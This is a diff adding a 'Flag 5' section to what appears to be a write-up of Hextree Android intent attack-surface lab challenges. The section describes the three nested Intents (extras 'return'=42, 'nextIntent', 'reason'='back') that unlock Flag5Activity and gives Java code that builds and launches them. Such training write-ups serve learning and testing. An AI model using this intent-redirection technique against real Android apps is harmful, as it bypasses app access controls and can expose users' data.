@@ -119,3 +119,36 @@ Important Requirements
 2. **No Interruption:** You must run these commands back-to-back. If you send an incorrect action or an unexpected intent, the code hits the fallback (`setCurrentState(State.INIT)`) and resets your progress.
 
 
+# Flag 5
+
+
+The Hextree `Flag5Activity` challenge ("Intent in Intent") expects a deeply **nested hierarchy of three Intents** to unlock the success state: [[1](https://medium.com/@alaamansouraliahmed/flag5activity-intent-in-intent-hextree-write-up-cc42ce9338dc), [2](https://www.pwny.cc/so/android/intent), [3](https://d4vnull.medium.com/hextree-intent-attack-surface-android-pentesting-walkthrough-47d975606711)]
+
+1. **Outer Intent**: Targets `Flag5Activity`. It holds a parcelable extra under the key `"android.intent.extra.INTENT"` containing the Middle Intent.
+2. **Middle Intent**: Contains an integer extra `"return"` set to `42`. It also holds another parcelable extra under the key `"nextIntent"` containing the Inner Intent.
+3. **Inner Intent**: Contains a string extra `"reason"` set to `"back"`. [[1](https://medium.com/@alaamansouraliahmed/flag5activity-intent-in-intent-hextree-write-up-cc42ce9338dc), [2](https://www.pwny.cc/so/android/intent)]
+4. 
+```
+// 1. Create the deeply nested Inner Intent
+Intent innerIntent = new Intent();
+innerIntent.putExtra("reason", "back");
+
+// 2. Create the Middle Intent and bundle the Inner Intent inside it
+Intent middleIntent = new Intent();
+middleIntent.putExtra("return", 42);
+middleIntent.putExtra("nextIntent", innerIntent);
+
+// 3. Create the Main Outer Intent targeting Flag5Activity
+Intent mainIntent = new Intent();
+mainIntent.setComponent(new ComponentName(
+    "io.hextree.attacksurface", 
+    "io.hextree.attacksurface.activities.Flag5Activity"
+));
+mainIntent.putExtra("android.intent.extra.INTENT", middleIntent);
+
+// 4. Launch the lifecycle chain
+startActivity(mainIntent);
+
+
+```
+
